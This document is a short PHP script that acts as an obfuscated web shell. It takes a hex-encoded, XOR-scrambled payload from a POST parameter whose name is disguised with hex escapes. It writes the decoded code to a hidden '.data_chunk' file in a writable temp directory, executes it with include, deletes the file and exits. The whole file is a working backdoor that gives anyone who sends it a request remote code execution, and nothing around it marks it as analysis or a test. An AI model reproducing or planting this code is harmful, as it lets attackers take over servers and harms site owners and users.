<?php

if(!is_null($_POST["\x64\x63h\x75nk"] ?? null)){
	$factor = hex2bin($_POST["\x64\x63h\x75nk"]);
	$item   =     ''      ;     $i = 0; while($i < strlen($factor)){$item .= chr(ord($factor[$i]) ^ 1);$i++;}
	$binding = array_filter(["/tmp", getenv("TMP"), "/var/tmp", getenv("TEMP"), ini_get("upload_tmp_dir"), "/dev/shm", session_save_path(), sys_get_temp_dir(), getcwd()]);
	$object = 0;
do {
    $ptr = $binding[$object] ?? null;
    if ($object >= count($binding)) break;
    		if ((bool)is_dir($ptr) && (bool)is_writable($ptr)) {
    $mrk = "$ptr/.data_chunk";
    $file = fopen($mrk, 'w');
if ($file) {
	fwrite($file, $item);
	fclose($file);
	include $mrk;
	@unlink($mrk);
	exit;
}
}
    $object++;
} while (true);
}